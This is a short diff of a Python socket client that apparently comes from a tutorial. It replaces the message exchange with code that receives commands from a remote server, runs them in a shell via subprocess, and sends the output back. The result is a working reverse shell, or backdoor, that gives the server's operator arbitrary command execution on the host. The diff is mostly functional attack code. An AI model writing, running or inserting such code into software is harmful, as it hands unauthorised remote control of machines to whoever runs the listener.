@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 # declaration of the socket
 # see documentation
@@ -10,13 +11,21 @@ sock.connect((ipaddress, 54321))
 print("Connection established to the server")
 
 while True:
-    message = sock.recv(1024)
-    print(message)
-    if message == "q":
+    command = sock.recv(1024)
+    if command == "q":
         break
     else:
-        answer = input("Type message to send to server: ")
-        sock.send(answer)
+        # creation of the command, see documentation
+        proc = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE
+        )
+        result = proc.stdout.read() + proc.stderr.read()
+        sock.send(result)
+
 
 # close the socket
 sock.close()
